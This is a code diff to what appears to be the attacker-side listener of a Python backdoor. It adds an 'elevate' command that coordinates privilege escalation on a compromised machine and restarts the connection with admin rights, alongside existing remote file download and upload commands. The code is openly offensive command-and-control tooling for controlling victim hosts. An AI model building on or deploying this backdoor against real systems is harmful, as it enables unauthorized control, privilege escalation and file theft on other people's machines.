@@ -1,9 +1,30 @@
 import os
 import socket
 import json
+import sys
 
 SERVER_IP = '192.168.254.49'  # IP of my Kali Linux machine
 SERVER_PORT = 5555
+
+
+def elevate_privilege():
+    response = ''
+    while True:
+        response = reliable_recv()
+        if response == '<SUCCESS>':
+            print('[+] Privilege elevated! Restarting connection with new privileges...')
+            target_sock.close()
+            server_sock.close()
+            # Restart the program
+            python = sys.executable
+            os.execl(python, python, *sys.argv)
+        elif response == '<FAIL>':
+            break
+        elif response == '<REDUNDANT>':
+            print('[!] Backdoor is already running with admin privileges')
+            break
+        else:
+            print(response)
 
 
 def reliable_send(data):
@@ -55,6 +76,8 @@ def target_communication():
             download_file(command[9:])
         elif command[:7] == 'upload ':
             upload_file(command[7:])
+        elif command == 'elevate':
+            elevate_privilege()
         else:
             result = reliable_recv()
             print(result)
